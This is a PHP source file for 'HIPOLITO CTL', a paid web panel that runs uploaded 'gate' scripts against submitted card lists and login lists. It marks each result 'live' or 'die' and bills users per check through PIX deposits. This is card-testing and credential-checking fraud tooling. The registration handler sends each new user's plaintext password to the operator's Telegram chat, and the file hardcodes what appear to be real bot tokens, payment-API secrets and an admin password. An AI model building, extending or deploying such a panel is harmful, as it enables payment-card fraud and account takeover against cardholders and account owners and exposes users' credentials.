<?php
ini_set('display_errors', 0);
ini_set('log_errors', 1);
error_reporting(E_ALL);
date_default_timezone_set('America/Sao_Paulo');

if (session_status() === PHP_SESSION_NONE) {
    session_set_cookie_params([
        'lifetime' => 86400,
        'path'     => '/',
        'secure'   => isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off',
        'httponly' => true,
        'samesite' => 'Lax',
    ]);
    session_name('HIPCTL');
    session_start();
}

header('X-Frame-Options: DENY');
header('X-Content-Type-Options: nosniff');
header('Referrer-Policy: no-referrer');
header_remove('X-Powered-By');

define('BRAND', '@hipolitoofc');
define('SITE_NAME', 'HIPOLITO CTL');
define('DB_DIR', __DIR__ . '/data');
define('DB_FILE', DB_DIR . '/hipolito.db');
define('API_DIR', __DIR__ . '/api');
define('LOGINS_DIR', __DIR__ . '/logins');
define('LIVE_COST', 1.00);
define('DIE_COST', 0.20);
define('DEP_MIN', 10.00);
define('DEP_MAX', 200.00);
define('ADMIN_USER', 'hipolito');
define('ADMIN_PASS', 'hipolitoofcadm');
define('BOT_TOKEN', '8952767112:AAGsG1yxraZXY0IkZ3QmIGu5_jfTXhhhGas');
define('ADMIN_TG', 8617449427);
define('ELITE_ID', 'ep_421737e484563dee4971477ca0c87575');
define('ELITE_SECRET', 'eps_43f74326495af4ef95c43bf9b501ef122e4410dc6a8eb48d9f19f972509e2945');
define('ELITE_URL', 'https://api.elitepaybr.com');
define('BASE_URL', getenv('BASE_URL') ?: 'https://hipolito-ctl.onrender.com');

if (!is_dir(DB_DIR)) @mkdir(DB_DIR, 0755, true);
if (!is_dir(API_DIR)) @mkdir(API_DIR, 0755, true);
if (!is_dir(LOGINS_DIR)) @mkdir(LOGINS_DIR, 0755, true);
@file_put_contents(DB_DIR . '/.htaccess', "Require all denied\nDeny from all\n");
@file_put_contents(DB_DIR . '/index.html', '');

function db(): SQLite3 {
    static $db = null;
    if ($db !== null) return $db;
    $db = new SQLite3(DB_FILE);
    $db->busyTimeout(5000);
    $db->exec('PRAGMA journal_mode = WAL');
    $db->exec('PRAGMA synchronous = NORMAL');
    $db->exec('CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT UNIQUE NOT NULL, password_hash TEXT NOT NULL, ip TEXT, balance REAL DEFAULT 0, total_checks INTEGER DEFAULT 0, total_lives INTEGER DEFAULT 0, total_dies INTEGER DEFAULT 0, total_deposited REAL DEFAULT 0, created_at TEXT DEFAULT CURRENT_TIMESTAMP, last_login TEXT, last_seen TEXT)');
    $db->exec('CREATE TABLE IF NOT EXISTS sessions (token TEXT PRIMARY KEY, user_id INTEGER NOT NULL, ip TEXT, user_agent TEXT, created_at TEXT DEFAULT CURRENT_TIMESTAMP, expires_at TEXT NOT NULL)');
    $db->exec('CREATE TABLE IF NOT EXISTS deposits (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER NOT NULL, transaction_id TEXT UNIQUE, amount REAL NOT NULL, net_amount REAL, status TEXT DEFAULT "pending", qrcode_url TEXT, copy_paste TEXT, payer_name TEXT, payer_document TEXT, ip TEXT, created_at TEXT DEFAULT CURRENT_TIMESTAMP, paid_at TEXT)');
    $db->exec('CREATE TABLE IF NOT EXISTS checks (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER NOT NULL, gate TEXT NOT NULL, gate_type TEXT NOT NULL, card TEXT NOT NULL, bin TEXT, result TEXT NOT NULL, cost REAL NOT NULL, response TEXT, ip TEXT, created_at TEXT DEFAULT CURRENT_TIMESTAMP)');
    $db->exec('CREATE TABLE IF NOT EXISTS audit_log (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, username TEXT, action TEXT NOT NULL, details TEXT, ip TEXT, created_at TEXT DEFAULT CURRENT_TIMESTAMP)');
    $db->exec('CREATE TABLE IF NOT EXISTS rate_limit (k TEXT PRIMARY KEY, attempts INTEGER DEFAULT 1, first_attempt INTEGER)');
    return $db;
}

function clientIp(): string {
    foreach (['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'REMOTE_ADDR'] as $k) {
        if (!empty($_SERVER[$k])) {
            $ip = trim(explode(',', $_SERVER[$k])[0]);
            if (filter_var($ip, FILTER_VALIDATE_IP)) return $ip;
        }
    }
    return '0.0.0.0';
}

function csrf(): string {
    if (empty($_SESSION['csrf'])) $_SESSION['csrf'] = bin2hex(random_bytes(32));
    return $_SESSION['csrf'];
}

function csrfOk(?string $t): bool {
    return !empty($_SESSION['csrf']) && is_string($t) && hash_equals($_SESSION['csrf'], $t);
}

function jsonOut(array $d, int $c = 200): void {
    http_response_code($c);
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode($d, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    exit;
}

function getSessionUser(): ?array {
    if (!empty($_SESSION['user_id'])) {
        $u = userById((int)$_SESSION['user_id']);
        if ($u) return $u;
    }
    if (!empty($_COOKIE['hipctl_token'])) {
        $u = userBySession($_COOKIE['hipctl_token']);
        if ($u) { $_SESSION['user_id'] = (int)$u['id']; return $u; }
    }
    return null;
}

function userCreate(string $username, string $password, string $ip): array {
    $db = db();
    $hash = password_hash($password, PASSWORD_DEFAULT);
    $stmt = $db->prepare('INSERT INTO users (username, password_hash, ip, last_seen) VALUES (:u, :p, :ip, CURRENT_TIMESTAMP)');
    $stmt->bindValue(':u', $username, SQLITE3_TEXT);
    $stmt->bindValue(':p', $hash, SQLITE3_TEXT);
    $stmt->bindValue(':ip', $ip, SQLITE3_TEXT);
    if (!$stmt->execute()) return ['ok' => false, 'error' => 'Erro ao criar conta'];
    return ['ok' => true, 'id' => $db->lastInsertRowID()];
}

function userByUsername(string $u): ?array {
    $db = db();
    $stmt = $db->prepare('SELECT * FROM users WHERE username = :u');
    $stmt->bindValue(':u', $u, SQLITE3_TEXT);
    $r = $stmt->execute()->fetchArray(SQLITE3_ASSOC);
    return $r ?: null;
}

function userById(int $id): ?array {
    $db = db();
    $stmt = $db->prepare('SELECT * FROM users WHERE id = :i');
    $stmt->bindValue(':i', $id, SQLITE3_INTEGER);
    $r = $stmt->execute()->fetchArray(SQLITE3_ASSOC);
    return $r ?: null;
}

function userBySession(string $t): ?array {
    $db = db();
    $stmt = $db->prepare('SELECT u.* FROM sessions s JOIN users u ON u.id = s.user_id WHERE s.token = :t AND s.expires_at > CURRENT_TIMESTAMP');
    $stmt->bindValue(':t', $t, SQLITE3_TEXT);
    $r = $stmt->execute()->fetchArray(SQLITE3_ASSOC);
    return $r ?: null;
}

function userTouch(int $id): void {
    $db = db();
    $stmt = $db->prepare('UPDATE users SET last_seen = CURRENT_TIMESTAMP, last_login = CURRENT_TIMESTAMP WHERE id = :i');
    $stmt->bindValue(':i', $id, SQLITE3_INTEGER);
    $stmt->execute();
}

function userAddBalance(int $id, float $a): float {
    $db = db();
    $stmt = $db->prepare('UPDATE users SET balance = balance + :a, total_deposited = total_deposited + :b WHERE id = :i');
    $stmt->bindValue(':a', $a, SQLITE3_FLOAT);
    $stmt->bindValue(':b', $a, SQLITE3_FLOAT);
    $stmt->bindValue(':i', $id, SQLITE3_INTEGER);
    $stmt->execute();
    $u = userById($id);
    return (float)$u['balance'];
}

function userDeductBalance(int $id, float $a): bool {
    $db = db();
    $u = userById($id);
    if (!$u || $u['balance'] < $a) return false;
    $stmt = $db->prepare('UPDATE users SET balance = balance - :a WHERE id = :i');
    $stmt->bindValue(':a', $a, SQLITE3_FLOAT);
    $stmt->bindValue(':i', $id, SQLITE3_INTEGER);
    return $stmt->execute() !== false;
}

function sessionCreate(int $uid, string $ip, string $ua): string {
    $db = db();
    $t = bin2hex(random_bytes(32));
    $stmt = $db->prepare('INSERT INTO sessions (token, user_id, ip, user_agent, expires_at) VALUES (:t, :u, :ip, :ua, datetime("now", "+86400 seconds"))');
    $stmt->bindValue(':t', $t, SQLITE3_TEXT);
    $stmt->bindValue(':u', $uid, SQLITE3_INTEGER);
    $stmt->bindValue(':ip', $ip, SQLITE3_TEXT);
    $stmt->bindValue(':ua', $ua, SQLITE3_TEXT);
    $stmt->execute();
    return $t;
}

function sessionDestroy(string $t): void {
    $db = db();
    $stmt = $db->prepare('DELETE FROM sessions WHERE token = :t');
    $stmt->bindValue(':t', $t, SQLITE3_TEXT);
    $stmt->execute();
}

function auditLog(?int $uid, ?string $un, string $action, string $details, string $ip): void {
    try {
        $db = db();
        $stmt = $db->prepare('INSERT INTO audit_log (user_id, username, action, details, ip) VALUES (:u, :un, :a, :d, :ip)');
        $stmt->bindValue(':u', $uid, SQLITE3_INTEGER);
        $stmt->bindValue(':un', $un, SQLITE3_TEXT);
        $stmt->bindValue(':a', $action, SQLITE3_TEXT);
        $stmt->bindValue(':d', $details, SQLITE3_TEXT);
        $stmt->bindValue(':ip', $ip, SQLITE3_TEXT);
        $stmt->execute();
    } catch (Throwable $e) {}
}

function rateCheck(string $action, string $ip, int $max, int $window): bool {
    $db = db();
    $key = $action . ':' . $ip;
    $stmt = $db->prepare('SELECT attempts, first_attempt FROM rate_limit WHERE k = :k');
    $stmt->bindValue(':k', $key, SQLITE3_TEXT);
    $row = $stmt->execute()->fetchArray(SQLITE3_ASSOC);
    $now = time();
    if (!$row) {
        $stmt = $db->prepare('INSERT INTO rate_limit (k, attempts, first_attempt) VALUES (:k, 1, :t)');
        $stmt->bindValue(':k', $key, SQLITE3_TEXT);
        $stmt->bindValue(':t', $now, SQLITE3_INTEGER);
        $stmt->execute();
        return true;
    }
    if ($now - $row['first_attempt'] > $window) {
        $stmt = $db->prepare('UPDATE rate_limit SET attempts = 1, first_attempt = :t WHERE k = :k');
        $stmt->bindValue(':t', $now, SQLITE3_INTEGER);
        $stmt->bindValue(':k', $key, SQLITE3_TEXT);
        $stmt->execute();
        return true;
    }
    if ($row['attempts'] >= $max) return false;
    $stmt = $db->prepare('UPDATE rate_limit SET attempts = attempts + 1 WHERE k = :k');
    $stmt->bindValue(':k', $key, SQLITE3_TEXT);
    $stmt->execute();
    return true;
}

function fmtMoney(float $v): string { return 'R$ ' . number_format($v, 2, ',', '.'); }
function esc(string $s): string { return htmlspecialchars($s, ENT_QUOTES | ENT_HTML5, 'UTF-8'); }

function tg(string $msg): void {
    try {
        $url = 'https://api.telegram.org/bot' . BOT_TOKEN . '/sendMessage';
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_POST => 1,
            CURLOPT_POSTFIELDS => http_build_query(['chat_id' => ADMIN_TG, 'text' => $msg, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true']),
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 6,
            CURLOPT_SSL_VERIFYPEER => false,
        ]);
        @curl_exec($ch);
        @curl_close($ch);
    } catch (Throwable $e) {}
}

function eliteReq(string $method, string $path, ?array $body = null): array {
    $ch = curl_init(ELITE_URL . $path);
    $opts = [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_CUSTOMREQUEST  => strtoupper($method),
        CURLOPT_HTTPHEADER     => [
            'x-client-id: ' . ELITE_ID,
            'x-client-secret: ' . ELITE_SECRET,
            'Content-Type: application/json',
            'Accept: application/json',
        ],
        CURLOPT_TIMEOUT => 20,
        CURLOPT_SSL_VERIFYPEER => true,
    ];
    if ($body !== null) $opts[CURLOPT_POSTFIELDS] = json_encode($body);
    curl_setopt_array($ch, $opts);
    $resp = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $err = curl_error($ch);
    curl_close($ch);
    if ($resp === false) return ['ok' => false, 'code' => 0, 'error' => $err, 'data' => null];
    $data = json_decode($resp, true);
    return ['ok' => $code >= 200 && $code < 300, 'code' => $code, 'error' => $code >= 400 ? ($data['message'] ?? 'HTTP ' . $code) : null, 'data' => $data];
}

function eliteDeposit(float $amount): array {
    $r = eliteReq('POST', '/api/v1/deposit', [
        'amount' => round($amount, 2),
        'description' => 'Deposito HIPOLITO CTL',
        'projectWebhook' => BASE_URL . '/webhook.php',
    ]);
    if (!$r['ok']) return ['ok' => false, 'error' => $r['error'] ?? 'Falha ElitePay'];
    $d = $r['data'] ?? [];
    if (empty($d['transactionId'])) return ['ok' => false, 'error' => 'Resposta sem TXID'];
    return [
        'ok' => true,
        'txid' => $d['transactionId'],
        'qr' => $d['qrcodeUrl'] ?? '',
        'copy' => $d['copyPaste'] ?? '',
    ];
}

function depositByTxid(string $txid): ?array {
    $db = db();
    $stmt = $db->prepare('SELECT * FROM deposits WHERE transaction_id = :t');
    $stmt->bindValue(':t', $txid, SQLITE3_TEXT);
    $r = $stmt->execute()->fetchArray(SQLITE3_ASSOC);
    return $r ?: null;
}

function listGates(): array {
    $g = ['gate' => [], 'login' => []];
    foreach (glob(API_DIR . '/*.{php,py}', GLOB_BRACE) ?: [] as $f) $g['gate'][] = basename($f);
    foreach (glob(LOGINS_DIR . '/*.{php,py}', GLOB_BRACE) ?: [] as $f) $g['login'][] = basename($f);
    sort($g['gate']); sort($g['login']);
    return $g;
}

$ip = clientIp();

if (isset($_GET['ping'])) { header('Content-Type: text/plain'); echo 'OK:' . time(); exit; }

if (isset($_GET['logout'])) {
    if (!empty($_COOKIE['hipctl_token'])) sessionDestroy($_COOKIE['hipctl_token']);
    setcookie('hipctl_token', '', time() - 3600, '/', '', isset($_SERVER['HTTPS']), true);
    session_destroy();
    header('Location: index.php'); exit;
}

try {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $raw = file_get_contents('php://input');
        $json = json_decode($raw, true);
        if (!is_array($json)) $json = $_POST;
        $action = $json['action'] ?? '';

        if ($action === '') jsonOut(['ok' => false, 'error' => 'Ação vazia'], 400);
        if (!csrfOk($json['csrf'] ?? '')) jsonOut(['ok' => false, 'error' => 'Sessão expirada. Recarregue a página.'], 403);

        if ($action === 'register') {
            if (!rateCheck('register', $ip, 5, 3600)) jsonOut(['ok' => false, 'error' => 'Muitas tentativas. Aguarde.']);
            $u = trim($json['username'] ?? '');
            $p = $json['password'] ?? '';
            if (strlen($u) < 3 || strlen($u) > 20) jsonOut(['ok' => false, 'error' => 'Username 3-20 chars']);
            if (!preg_match('/^[a-zA-Z0-9_]+$/', $u)) jsonOut(['ok' => false, 'error' => 'Só letras, números e _']);
            if (strlen($p) < 6) jsonOut(['ok' => false, 'error' => 'Senha mínima 6 chars']);
            if (preg_match('/^\d+$/', $p)) jsonOut(['ok' => false, 'error' => 'Senha não pode ser só números']);
            if (userByUsername($u)) jsonOut(['ok' => false, 'error' => 'Username já existe']);
            $r = userCreate($u, $p, $ip);
            if (!$r['ok']) jsonOut($r);
            $t = sessionCreate((int)$r['id'], $ip, $_SERVER['HTTP_USER_AGENT'] ?? '');
            setcookie('hipctl_token', $t, time() + 86400, '/', '', isset($_SERVER['HTTPS']), true);
            $_SESSION['user_id'] = (int)$r['id'];
            auditLog((int)$r['id'], $u, 'register', "ip=$ip", $ip);
            tg("👤 <b>NOVO USUÁRIO</b>\n\n📛 <b>$u</b>\n🔑 <code>" . esc($p) . "</code>\n📱 <code>$ip</code>\n⚡ " . BRAND);
            jsonOut(['ok' => true]);
        }

        if ($action === 'login') {
            if (!rateCheck('login', $ip, 10, 900)) jsonOut(['ok' => false, 'error' => 'Muitas tentativas. Aguarde 15 min.']);
            $u = trim($json['username'] ?? '');
            $p = $json['password'] ?? '';
            $user = userByUsername($u);
            if (!$user || !password_verify($p, $user['password_hash'])) {
                auditLog(null, $u, 'login_fail', "ip=$ip", $ip);
                jsonOut(['ok' => false, 'error' => 'Usuário ou senha inválidos']);
            }
            $t = sessionCreate((int)$user['id'], $ip, $_SERVER['HTTP_USER_AGENT'] ?? '');
            setcookie('hipctl_token', $t, time() + 86400, '/', '', isset($_SERVER['HTTPS']), true);
            $_SESSION['user_id'] = (int)$user['id'];
            userTouch((int)$user['id']);
            auditLog((int)$user['id'], $user['username'], 'login', "ip=$ip", $ip);
            jsonOut(['ok' => true]);
        }

        if (in_array($action, ['deposit', 'check', 'balance', 'status'], true)) {
            $user = getSessionUser();
            if (!$user) jsonOut(['ok' => false, 'error' => 'Faça login primeiro'], 401);
            userTouch((int)$user['id']);

            if ($action === 'deposit') {
                if (!rateCheck('dep', $ip, 5, 600)) jsonOut(['ok' => false, 'error' => 'Muitas tentativas.']);
                $amt = (float)($json['amount'] ?? 0);
                if ($amt < DEP_MIN || $amt > DEP_MAX) jsonOut(['ok' => false, 'error' => 'Valor entre ' . fmtMoney(DEP_MIN) . ' e ' . fmtMoney(DEP_MAX)]);
                $r = eliteDeposit($amt);
                if (!$r['ok']) jsonOut(['ok' => false, 'error' => $r['error']]);
                $db = db();
                $stmt = $db->prepare('INSERT INTO deposits (user_id, transaction_id, amount, status, qrcode_url, copy_paste, ip) VALUES (:u, :t, :a, "pending", :q, :c, :ip)');
                $stmt->bindValue(':u', (int)$user['id'], SQLITE3_INTEGER);
                $stmt->bindValue(':t', $r['txid'], SQLITE3_TEXT);
                $stmt->bindValue(':a', $amt, SQLITE3_FLOAT);
                $stmt->bindValue(':q', $r['qr'], SQLITE3_TEXT);
                $stmt->bindValue(':c', $r['copy'], SQLITE3_TEXT);
                $stmt->bindValue(':ip', $ip, SQLITE3_TEXT);
                $stmt->execute();
                auditLog((int)$user['id'], $user['username'], 'deposit_create', "amount=$amt txid={$r['txid']}", $ip);
                tg("🎫 <b>PIX GERADO</b>\n\n👤 <b>" . $user['username'] . "</b>\n💵 " . fmtMoney($amt) . "\n📱 <code>$ip</code>\n⚡ " . BRAND);
                jsonOut(['ok' => true, 'txid' => $r['txid'], 'qr' => $r['qr'], 'copy' => $r['copy'], 'amount' => $amt]);
            }

            if ($action === 'status') {
                $txid = trim($json['txid'] ?? '');
                $d = depositByTxid($txid);
                if (!$d || (int)$d['user_id'] !== (int)$user['id']) jsonOut(['ok' => false, 'error' => 'Não encontrado']);
                jsonOut(['ok' => true, 'status' => $d['status'], 'amount' => (float)$d['amount']]);
            }

            if ($action === 'balance') {
                $fresh = userById((int)$user['id']);
                jsonOut(['ok' => true, 'balance' => (float)$fresh['balance']]);
            }

            if ($action === 'check') {
                if (!rateCheck('check', $ip, 60, 60)) jsonOut(['ok' => false, 'error' => 'Rate limit']);
                $gate = trim($json['gate'] ?? '');
                $type = $json['type'] ?? 'gate';
                $lista = trim($json['lista'] ?? '');
                if (!in_array($type, ['gate', 'login'], true)) jsonOut(['ok' => false, 'error' => 'Tipo inválido']);
                if (!$gate || !$lista) jsonOut(['ok' => false, 'error' => 'Dados vazios']);

                $dir = $type === 'gate' ? API_DIR : LOGINS_DIR;
                $files = array_map('basename', glob($dir . '/*.{php,py}', GLOB_BRACE) ?: []);
                if (!in_array($gate, $files, true)) jsonOut(['ok' => false, 'error' => 'Gate não existe']);
                $path = $dir . '/' . $gate;
                $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));

                if ((float)$user['balance'] < DIE_COST) jsonOut(['ok' => false, 'error' => 'Saldo insuficiente. Deposite primeiro.']);

                $response = '';
                if ($ext === 'php') {
                    $_GET['lista'] = $lista;
                    $_GET['gate']  = $gate;
                    $_SESSION['user_id'] = (int)$user['id'];
                    ob_start();
                    try { include $path; $response = ob_get_clean(); }
                    catch (Throwable $e) { ob_end_clean(); $response = '❌ Erro: ' . $e->getMessage(); }
                } else {
                    $response = shell_exec('python3 ' . escapeshellarg($path) . ' ' . escapeshellarg($lista) . ' 2>&1') ?? '❌ Sem resposta';
                }

                $rl = strtolower($response);
                $liveWords = ['✅', 'aprovada', 'approved', 'success', 'live', 'autorizado', 'valid', 'aprovado', 'apvd', 'ativa', 'active', 'cvv', 'saldo'];
                $isLive = false;
                foreach ($liveWords as $w) { if (strpos($rl, $w) !== false) { $isLive = true; break; } }
                if (strpos($response, '❌') === 0) $isLive = false;

                $cost = $isLive ? LIVE_COST : DIE_COST;
                if (!userDeductBalance((int)$user['id'], $cost)) jsonOut(['ok' => false, 'error' => 'Saldo insuficiente']);

                $card = $type === 'gate' ? preg_replace('/[^0-9]/', '', explode('|', $lista)[0]) : $lista;
                $bin = $type === 'gate' ? substr($card, 0, 6) : '';
                $db = db();
                $stmt = $db->prepare('INSERT INTO checks (user_id, gate, gate_type, card, bin, result, cost, response, ip) VALUES (:u,:g,:t,:c,:b,:r,:co,:re,:ip)');
                $stmt->bindValue(':u', (int)$user['id'], SQLITE3_INTEGER);
                $stmt->bindValue(':g', $gate, SQLITE3_TEXT);
                $stmt->bindValue(':t', $type, SQLITE3_TEXT);
                $stmt->bindValue(':c', $card, SQLITE3_TEXT);
                $stmt->bindValue(':b', $bin, SQLITE3_TEXT);
                $stmt->bindValue(':r', $isLive ? 'live' : 'die', SQLITE3_TEXT);
                $stmt->bindValue(':co', $cost, SQLITE3_FLOAT);
                $stmt->bindValue(':re', $response, SQLITE3_TEXT);
                $stmt->bindValue(':ip', $ip, SQLITE3_TEXT);
                $stmt->execute();
                $col = $isLive ? 'total_lives' : 'total_dies';
                $stmt = $db->prepare("UPDATE users SET total_checks = total_checks + 1, $col = $col + 1 WHERE id = :u");
                $stmt->bindValue(':u', (int)$user['id'], SQLITE3_INTEGER);
                $stmt->execute();

                $fresh = userById((int)$user['id']);
                jsonOut(['ok' => true, 'live' => $isLive, 'response' => $response, 'cost' => $cost, 'balance' => (float)$fresh['balance']]);
            }
        }

        jsonOut(['ok' => false, 'error' => 'Ação desconhecida: ' . $action], 400);
    }
} catch (Throwable $e) {
    jsonOut(['ok' => false, 'error' => 'Erro servidor: ' . $e->getMessage()], 500);
}

$user = getSessionUser();
$csrf = csrf();
$gates = listGates();
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title><?= SITE_NAME ?></title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
<style>
*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
:root{--green:#00ff88;--cyan:#00d4ff;--yellow:#fbbf24;--red:#ef4444;--purple:#a78bfa;--bg:#04060c;--surface:rgba(10,15,26,.7);--border:rgba(0,255,136,.18);--text:#e2e8f0;--muted:#64748b}
html,body{min-height:100vh}
body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);line-height:1.5;overflow-x:hidden;position:relative}
body::before{content:'';position:fixed;inset:0;z-index:0;background:radial-gradient(ellipse 900px 600px at 15% 10%,rgba(0,255,136,.08),transparent 60%),radial-gradient(ellipse 800px 600px at 85% 90%,rgba(0,212,255,.06),transparent 60%),radial-gradient(ellipse 600px 400px at 50% 50%,rgba(167,139,250,.04),transparent 60%);pointer-events:none}
body::after{content:'';position:fixed;inset:0;z-index:0;background-image:linear-gradient(rgba(0,255,136,.02) 1px,transparent 1px),linear-gradient(90deg,rgba(0,255,136,.02) 1px,transparent 1px);background-size:48px 48px;mask-image:radial-gradient(ellipse at center,#000 30%,transparent 80%);pointer-events:none}
.wrap{position:relative;z-index:1;min-height:100vh}

/* ============ AUTH ============ */
.auth-stage{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px}
.auth-card{width:100%;max-width:460px;background:linear-gradient(180deg,rgba(10,15,26,.95),rgba(5,8,18,.95));backdrop-filter:blur(30px);border:1px solid var(--border);border-radius:28px;padding:44px 38px;box-shadow:0 30px 80px rgba(0,0,0,.6),0 0 60px rgba(0,255,136,.06);position:relative;overflow:hidden;animation:cardIn .7s cubic-bezier(.2,.9,.3,1.15)}
@keyframes cardIn{from{opacity:0;transform:translateY(30px) scale(.95)}to{opacity:1;transform:translateY(0) scale(1)}}
.auth-card::before{content:'';position:absolute;top:-50%;left:-50%;width:200%;height:200%;background:conic-gradient(from 0deg,transparent,rgba(0,255,136,.1),transparent 30%);animation:spin 8s linear infinite;opacity:.4;pointer-events:none}
@keyframes spin{to{transform:rotate(360deg)}}
.auth-inner{position:relative;z-index:1}
.auth-logo{text-align:center;margin-bottom:32px}
.auth-logo .icon{width:74px;height:74px;margin:0 auto 18px;background:linear-gradient(135deg,var(--green),var(--cyan));border-radius:20px;display:flex;align-items:center;justify-content:center;font-size:34px;box-shadow:0 10px 40px rgba(0,255,136,.35),inset 0 1px 0 rgba(255,255,255,.3);animation:float 4s ease-in-out infinite}
@keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-6px)}}
.auth-logo h1{font-size:26px;font-weight:900;letter-spacing:-.5px;background:linear-gradient(135deg,#fff,var(--green));-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:4px}
.auth-logo p{font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:4px;font-weight:600}
.auth-tabs{display:flex;background:rgba(0,0,0,.4);border-radius:14px;padding:5px;margin-bottom:26px;border:1px solid rgba(255,255,255,.05)}
.auth-tab{flex:1;padding:11px;text-align:center;font-size:12px;font-weight:700;cursor:pointer;border-radius:10px;transition:all .3s;color:var(--muted);text-transform:uppercase;letter-spacing:1px}
.auth-tab.active{background:linear-gradient(135deg,var(--green),var(--cyan));color:#000;box-shadow:0 4px 16px rgba(0,255,136,.3)}
.auth-form{display:none}
.auth-form.active{display:block;animation:fadeUp .4s}
@keyframes fadeUp{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
.field{margin-bottom:16px;position:relative}
.field label{display:block;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;color:var(--cyan);margin-bottom:8px}
.field input{width:100%;padding:15px 48px 15px 18px;background:rgba(0,0,0,.5);border:1.5px solid rgba(255,255,255,.08);border-radius:13px;color:var(--text);font-size:14px;font-family:inherit;outline:none;transition:all .25s}
.field input:focus{border-color:var(--green);background:rgba(0,255,136,.03);box-shadow:0 0 0 4px rgba(0,255,136,.08)}
.field .eye{position:absolute;right:16px;bottom:15px;font-size:16px;opacity:.4;cursor:pointer;user-select:none}
.field .eye:hover{opacity:1}
.btn-main{width:100%;padding:16px;background:linear-gradient(135deg,var(--green),var(--cyan));border:none;border-radius:13px;color:#000;font-size:13px;font-weight:800;text-transform:uppercase;letter-spacing:1.5px;cursor:pointer;transition:all .25s;font-family:inherit;box-shadow:0 6px 20px rgba(0,255,136,.25)}
.btn-main:hover:not(:disabled){transform:translateY(-2px);box-shadow:0 10px 30px rgba(0,255,136,.4)}
.btn-main:disabled{opacity:.6;cursor:not-allowed}
.msg{padding:13px 16px;border-radius:12px;font-size:13px;margin-bottom:16px;display:none;animation:fadeUp .3s;font-weight:500}
.msg.show{display:block}
.msg.ok{background:rgba(0,255,136,.1);border:1px solid rgba(0,255,136,.3);color:var(--green)}
.msg.err{background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.3);color:#fca5a5}
.auth-footer{text-align:center;margin-top:24px;font-size:11px;color:var(--muted)}
.auth-footer strong{color:var(--green)}

/* ============ DASH ============ */
.nav{position:sticky;top:0;z-index:50;backdrop-filter:blur(30px);background:rgba(4,6,12,.85);border-bottom:1px solid var(--border);padding:14px 24px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px}
.nav .brand{display:flex;align-items:center;gap:12px}
.nav .brand .ico{width:40px;height:40px;background:linear-gradient(135deg,var(--green),var(--cyan));border-radius:11px;display:flex;align-items:center;justify-content:center;font-size:20px;box-shadow:0 4px 14px rgba(0,255,136,.3)}
.nav .brand h1{font-size:16px;font-weight:900;background:linear-gradient(135deg,#fff,var(--green));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.nav .brand p{font-size:9px;color:var(--muted);text-transform:uppercase;letter-spacing:2px}
.nav .right{display:flex;align-items:center;gap:10px;flex-wrap:wrap}
.bal-pill{background:rgba(0,255,136,.08);border:1px solid rgba(0,255,136,.3);padding:9px 16px;border-radius:11px;display:flex;align-items:center;gap:8px}
.bal-pill .lbl{font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:1px;font-weight:700}
.bal-pill .val{font-size:15px;font-weight:800;color:var(--green);font-family:'JetBrains Mono',monospace}
.user-pill{display:flex;align-items:center;gap:8px;background:rgba(255,255,255,.04);padding:7px 12px;border-radius:11px;border:1px solid rgba(255,255,255,.08)}
.user-pill .av{width:30px;height:30px;background:linear-gradient(135deg,var(--green),var(--cyan));border-radius:8px;display:flex;align-items:center;justify-content:center;font-weight:800;color:#000;font-size:13px}
.user-pill .nm{font-size:12px;font-weight:600}
.btn-out{padding:9px 14px;background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.3);border-radius:10px;color:#f87171;font-size:11px;font-weight:700;text-decoration:none;transition:all .2s;text-transform:uppercase;letter-spacing:.5px}
.btn-out:hover{background:rgba(239,68,68,.18)}

.container{max-width:1100px;margin:0 auto;padding:24px}
.card{background:linear-gradient(180deg,rgba(10,15,26,.85),rgba(5,8,18,.9));backdrop-filter:blur(20px);border:1px solid var(--border);border-radius:20px;padding:24px;margin-bottom:20px;box-shadow:0 10px 40px rgba(0,0,0,.3)}
.card-title{font-size:13px;font-weight:800;text-transform:uppercase;letter-spacing:1.5px;color:var(--green);margin-bottom:16px;display:flex;align-items:center;gap:10px}
.deposit-row{display:flex;gap:10px;align-items:stretch;flex-wrap:wrap}
.deposit-row input{flex:1;min-width:140px;padding:13px 16px;background:rgba(0,0,0,.5);border:1.5px solid rgba(255,255,255,.08);border-radius:11px;color:var(--text);font-size:15px;font-family:'JetBrains Mono',monospace;font-weight:700;outline:none;transition:all .2s}
.deposit-row input:focus{border-color:var(--green);box-shadow:0 0 0 3px rgba(0,255,136,.08)}
.deposit-hint{font-size:11px;color:var(--muted);margin-top:8px}
